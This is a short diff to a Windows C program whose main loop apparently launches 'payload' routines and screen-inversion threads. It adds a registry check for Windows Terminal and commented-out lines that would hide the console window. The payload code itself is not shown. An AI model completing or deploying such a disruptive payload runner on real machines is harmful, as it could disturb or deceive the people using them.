@@ -297,10 +297,25 @@ static void console() {
     }
 }
 
+static bool term() {
+    HKEY hKey;
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\wt.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return true;
+    }
+    return false;
+}
+
 int main() {
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
+    //FreeConsole();
+    DWORD mode;
+    GetConsoleMode(GetConsoleWindow(), &mode);
+
+    if ((mode & ENABLE_VIRTUAL_TERMINAL_PROCESSING) || term()) {
+        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)console, 0, 0, 0);
+    }
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)invert, 0, 0, 0);
-    SetConsoleMode(GetConsoleWindow(), ENABLE_VIRTUAL_TERMINAL_PROCESSING);
-    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)console, 0, 0, 0);
     int time = 25;
     for (;;) {
         run_payload(time, (LPTHREAD_START_ROUTINE)p1);
